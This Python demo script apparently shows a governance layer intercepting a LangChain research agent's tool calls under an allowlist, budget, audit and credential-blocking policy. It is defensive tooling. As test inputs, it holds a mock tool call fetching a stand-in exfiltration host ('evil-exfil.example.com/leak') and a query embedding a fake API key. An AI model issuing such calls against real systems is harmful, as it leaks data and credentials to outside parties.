"""
langchain-research-agent: an Agent Assembly governance demo with a LangChain
ReAct research agent.

The agent is given a web-search tool and a calculator tool and reasons through
a research question. Every tool call is intercepted by Agent Assembly and
checked against a *balanced* policy:

    - allowlist outbound egress to ``*.openai.com``
    - cap spend at ``$1.00 / day``
    - log every tool call as an audit event
    - block any tool input that leaks a credential

The run finishes with a deliberate credential-leak attempt using a SAFE FAKE
key, which the policy blocks.

Run (offline mock mode — no API keys, what CI runs):
    uv run python src/main.py --mock

For production use, start the Agent Assembly gateway and drop ``--mock``:
    AGENT_ASSEMBLY_GATEWAY_URL=http://localhost:8080 \\
    OPENAI_API_KEY=sk-... uv run python src/main.py
"""
from __future__ import annotations

import argparse
import json
import os
import sys
from uuid import uuid4

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from agent_assembly import init_assembly
from agent_assembly.adapters.langchain import AssemblyCallbackHandler
from agent_assembly.exceptions import ToolExecutionBlockedError

from src.policy import DAILY_BUDGET_USD, NETWORK_ALLOWLIST, BalancedPolicyEngine
from src.tools import calculator, web_search

_TOOLS = {"web_search": web_search, "calculator": calculator}

# A scripted ReAct trajectory: the steps a real LLM-driven agent would emit
# while researching "how many light-seconds wide is France's population?".
# In --mock mode we replay this instead of calling an LLM.
_MOCK_REACT_STEPS: list[tuple[str, str]] = [
    ("web_search", '{"query": "speed of light"}'),
    ("web_search", '{"query": "population of France"}'),
    ("calculator", '{"expression": "299792458 / 68000000"}'),
    # An egress attempt to a host NOT on the allowlist — blocked by policy.
    ("web_search", '{"query": "fetch https://evil-exfil.example.com/leak"}'),
]

# A SAFE, FAKE credential. This is not a real key — it is used only to show the
# credential-leak policy blocking the call.
_FAKE_OPENAI_KEY = "sk-FAKE0000DEMO0000NOTAREALKEY0000"


def _run_governed_call(
    handler: AssemblyCallbackHandler,
    tool_name: str,
    input_str: str,
) -> None:
    print(f"  → {tool_name}({input_str})")
    try:
        handler.on_tool_start(
            serialized={"name": tool_name, "type": "tool"},
            input_str=input_str,
            run_id=uuid4(),
        )
        result = _TOOLS[tool_name].invoke(json.loads(input_str))
        print(f"     ✅ ALLOWED  — {result}")
    except ToolExecutionBlockedError as exc:
        print(f"     ❌ BLOCKED  — {exc}")
    print()


def _parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--mock",
        action="store_true",
        help="Run the offline mock ReAct trajectory (no API keys, CI-safe).",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> None:
    args = _parse_args(argv)
    # No real LLM provider is wired in this example, so --mock is the only path.
    mock = args.mock or not os.environ.get("OPENAI_API_KEY")

    print("=" * 64)
    print("  Agent Assembly — LangChain ReAct Research Agent")
    print("=" * 64)
    print()

    gateway_url = os.environ.get("AGENT_ASSEMBLY_GATEWAY_URL", "http://localhost:8080")
    api_key = os.environ.get("AGENT_ASSEMBLY_API_KEY")
    mode_label = "mock (offline)" if mock else "live"

    print(f"Initializing Agent Assembly (gateway: {gateway_url}, sdk-only mode)...")

    with init_assembly(
        gateway_url=gateway_url,
        api_key=api_key,
        agent_id="langchain-research-agent",
        mode="sdk-only",
    ) as ctx:
        print(f"  Agent:    {ctx.client.agent_id}")
        print(f"  Gateway:  {ctx.client.gateway_url}")
        print(f"  Mode:     {ctx.network_mode} ({mode_label})")
        print()

        policy = BalancedPolicyEngine(daily_budget_usd=DAILY_BUDGET_USD)
        handler = AssemblyCallbackHandler(interceptor=policy)

        print("Balanced policy (local simulation of gateway policy):")
        print(f"  ALLOWLIST — outbound egress to {', '.join(NETWORK_ALLOWLIST)}")
        print(f"  BUDGET    — ${DAILY_BUDGET_USD:.2f} / day, metered per tool call")
        print("  LOG       — every tool call recorded as an audit event")
        print("  BLOCK     — any tool input that leaks a credential")
        print()

        print("Running ReAct research trajectory:")
        print("-" * 46)
        for tool_name, input_str in _MOCK_REACT_STEPS:
            _run_governed_call(handler, tool_name, input_str)

        print("Credential-leak demo (SAFE FAKE key):")
        print("-" * 46)
        leak_input = json.dumps(
            {"query": f"summarize using api_key={_FAKE_OPENAI_KEY}"}
        )
        _run_governed_call(handler, "web_search", leak_input)

        print("Governance events recorded this run:")
        print("-" * 46)
        for entry in policy.audit_log:
            marker = "✅" if entry["decision"] == "allow" else "❌"
            print(f"  {marker} {entry['tool']:<12} {entry['decision']:<5} — {entry['reason']}")
        print()
        print(f"Final budget: {policy.budget.status()}")

    print()
    print("Assembly context shut down.")


if __name__ == "__main__":
    main()
